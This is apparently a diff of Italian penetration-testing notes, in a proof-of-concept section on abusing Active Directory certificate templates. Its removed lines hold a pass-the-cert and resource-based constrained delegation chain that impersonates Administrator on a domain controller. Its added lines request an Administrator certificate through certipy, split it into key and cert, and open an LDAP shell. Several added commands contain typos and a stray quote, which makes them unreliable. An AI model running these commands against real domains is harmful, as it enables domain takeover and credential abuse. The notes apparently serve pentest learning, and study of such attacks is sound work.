@@ -274,20 +274,21 @@ In entrambi i casi, il DC richiederà (ma non richiederà obbligatoriamente) il 
 
 #### Proof of Concept
 
-Creazione di un nuovo pc nel dominio
+Sfrutto certipy per ottenere un certificato pfx di un template vulnerabile.
+
 ```
-python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
+python3 certpy.py req -u "user" -p "pass" -target-ip "IPDC" -ca "certificate authrotiy" -template "vulntemplate" -upn "Administrator@.local"
 ```
 
-Aggiungere il SID di questo nuovo computer all'attributo msDS-AllowedToActOnBehalfOfOtherIdentity del tuo Controller di Dominio:
+Ottengo la key e la crt da pfx. Un file PFX (o PKCS #12) è un formato binario per archiviare un certificato con la sua chiave privata in un unico file.
+
 ```
-python3 passthecert.py --server ad1.contoso.com -crt user.crt -key user.key --rbcd --target "CN=AD2,OU=Domain Controllers,DC=contoso,DC=com" --sid "S-1-5-21-863927164-4106933278-53377030-3122"
+python3 certipy cert -pfx cert.pfx -nokey -out user.crt
+python3 certipy cert -pfx cert.pfx -nocert -out user.key
 ```
 
-Infine avvio di un attacco RBCD impersonificando Administrator sul Domain Controller
+Ottengo una shell tramite LDAP usando SCHANNEL come meccanismo di auth:
 ```
-python3 getST.py -spn 'cifs/ad2.contoso.com' -impersonate Administrateur 'contoso.com/desktop-1337$:Q2cpNOMhwlU2yZQBPAbJ1YY9M9XJIfBc'
+python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip "IPDC" "
+```
 
-export KRB5CCNAME=Administrateur.ccache
-wmiexec.py -k -no-pass contoso.com/Administrateur@ad2.contoso.com
-```
